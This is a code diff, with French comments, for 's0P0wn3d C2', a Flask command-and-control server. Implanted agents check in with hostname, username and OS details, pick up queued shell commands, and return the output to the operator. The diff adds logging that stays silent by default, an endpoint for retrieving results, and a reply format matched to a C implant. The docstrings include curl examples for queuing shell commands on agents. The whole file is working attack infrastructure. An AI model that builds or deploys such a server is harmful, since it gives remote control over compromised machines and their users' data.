@@ -1,11 +1,33 @@
+#!/usr/bin/env python3
+"""
+s0P0wn3d C2 - Server
+"""
+
 from flask import Flask, request, jsonify
 from datetime import datetime
+import logging
+import sys
 
 app = Flask(__name__)
 
+# Configuration du logging Flask (mode silencieux par défaut)
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
+
+# Stockage en mémoire
 agents = {}
 commands_queue = {}
 results = {}
+
+# Mode verbose (activé avec --verbose)
+VERBOSE = "--verbose" in sys.argv
+
+
+def vprint(message):
+    """Print seulement en mode verbose"""
+    if VERBOSE:
+        print(message)
+
 
 def send_command(agent_id, cmd_type, cmd_data):
     """
@@ -16,21 +38,21 @@ def send_command(agent_id, cmd_type, cmd_data):
         cmd_type: Type de commande (ex: "shell")
         cmd_data: Données de la commande (ex: "whoami")
     """
-    # Créer la queue si elle n'existe pas
     if agent_id not in commands_queue:
         commands_queue[agent_id] = []
 
-    # Ajouter la commande
     commands_queue[agent_id].append({
         "type": cmd_type,
         "command": cmd_data
     })
 
-    print(f"[QUEUE] Added for {agent_id}: {cmd_type} -> {cmd_data}")
+    vprint(f"[QUEUE] Added for {agent_id}: {cmd_type} -> {cmd_data}")
+
 
 @app.route("/")
 def hello():
-    return "Hello World"
+    """Endpoint de test"""
+    return jsonify({"status": "ok", "message": "s0P0wn3d C2 Server"})
 
 
 @app.route("/command", methods=["POST"])
@@ -38,10 +60,10 @@ def add_command():
     """
     Ajoute une commande dans la queue d'un agent.
 
-    Exemple d'utilisation :
+    Exemple:
     curl -X POST http://localhost:8443/command \
       -H "Content-Type: application/json" \
-      -d '{"agent_id":"PC1_a4f2","type":"shell","command":"whoami"}'
+      -d '{"agent_id":"TEST_C","type":"shell","command":"whoami"}'
     """
     data = request.get_json()
 
@@ -49,14 +71,12 @@ def add_command():
     cmd_type = data.get("type")
     cmd_data = data.get("command")
 
-    # Vérifier que tous les champs sont présents
     if not agent_id or not cmd_type or not cmd_data:
         return jsonify({
             "status": "error",
             "message": "Missing fields: agent_id, type, or command"
         }), 400
 
-    # Ajouter la commande
     send_command(agent_id, cmd_type, cmd_data)
 
     return jsonify({
@@ -64,8 +84,13 @@ def add_command():
         "message": f"Command queued for {agent_id}"
     })
 
+
 @app.route("/beacon", methods=["POST"])
 def beacon():
+    """
+    Endpoint pour les beacons des agents.
+    L'agent envoie ses infos et reçoit les commandes en attente.
+    """
     data = request.get_json()
 
     agent_id = data.get("agent_id", "UNKNOWN")
@@ -78,25 +103,32 @@ def beacon():
         "hostname": hostname,
         "username": username,
         "os": os_info,
-        "last_seen": datetime.now()
+        "last_seen": datetime.now().isoformat()
     }
 
-    # Récupérer les commandes en attente pour CET agent
+    # Récupérer les commandes en attente
     pending_commands = commands_queue.get(agent_id, [])
-
-    # Vider la queue après récupération
     commands_queue[agent_id] = []
 
-    print(f"[BEACON] {agent_id} | Commands sent: {len(pending_commands)}")
+    vprint(f"[BEACON] {agent_id} ({hostname}) | Commands: {len(pending_commands)}")
 
-    # Répondre avec les commandes
-    return jsonify({
-        "status": "ok",
-        "commands": pending_commands
-    })
+    # IMPORTANT: L'agent C attend un format spécifique
+    # Il cherche "command" dans le JSON, pas "commands"
+    if pending_commands:
+        # Pour compatibilité avec l'agent C actuel
+        return jsonify({
+            "status": "ok",
+            "command": pending_commands[0]["command"]  # Une seule commande pour l'instant
+        })
+    else:
+        return jsonify({
+            "status": "ok"
+        })
+
 
 @app.route("/agents", methods=["GET"])
 def list_agents():
+    """Liste tous les agents enregistrés"""
     return jsonify({
         "total": len(agents),
         "agents": agents
@@ -108,11 +140,11 @@ def receive_result():
     """
     Reçoit les résultats d'exécution de commandes.
 
-    Exemple :
+    Exemple:
     curl -X POST http://localhost:8443/result \
       -H "Content-Type: application/json" \
       -d '{
-        "agent_id": "PC1_a4f2",
+        "agent_id": "TEST_C",
         "command": "whoami",
         "output": "WIN10\\Alice",
         "timestamp": "2025-02-03T10:30:45"
@@ -125,26 +157,58 @@ def receive_result():
     output = data.get("output")
     timestamp = data.get("timestamp")
 
-    # Créer la liste de résultats si elle n'existe pas
     if agent_id not in results:
         results[agent_id] = []
 
-    # Stocker le résultat
     results[agent_id].append({
         "command": command,
         "output": output,
         "timestamp": timestamp
     })
 
-    # Afficher dans la console
-    print(f"\n{'=' * 70}")
-    print(f"[+] RÉSULTAT de {agent_id}")
-    print(f"[>] Commande : {command}")
-    print(f"[<] Output :")
-    print(output)
-    print(f"{'=' * 70}\n")
+    # Afficher SEULEMENT en mode verbose
+    if VERBOSE:
+        print(f"\n{'=' * 70}")
+        print(f"[+] RESULT from {agent_id}")
+        print(f"[>] Command: {command}")
+        print(f"[<] Output:")
+        print(output)
+        print(f"{'=' * 70}\n")
 
     return jsonify({"status": "ok"})
 
+
+@app.route("/results/<agent_id>", methods=["GET"])
+def get_results(agent_id):
+    """
+    Récupère tous les résultats d'un agent.
+    """
+    if agent_id not in results:
+        return jsonify({
+            "status": "error",
+            "message": f"No results found for {agent_id}"
+        }), 404
+
+    return jsonify({
+        "status": "ok",
+        "agent_id": agent_id,
+        "count": len(results[agent_id]),
+        "results": results[agent_id]
+    })
+
+
 if __name__ == "__main__":
-    app.run("0.0.0.0",port=8443)
+    print("=" * 70)
+    print("s0P0wn3d C2 Server")
+    print("=" * 70)
+    print(f"[*] Listening on 0.0.0.0:8443")
+    print(f"[*] Verbose mode: {'ON' if VERBOSE else 'OFF'}")
+    print(f"[*] Start with --verbose for detailed logs")
+    print("=" * 70 + "\n")
+
+    app.run(
+        host="0.0.0.0",
+        port=8443,
+        debug=False,
+        threaded=True
+    )
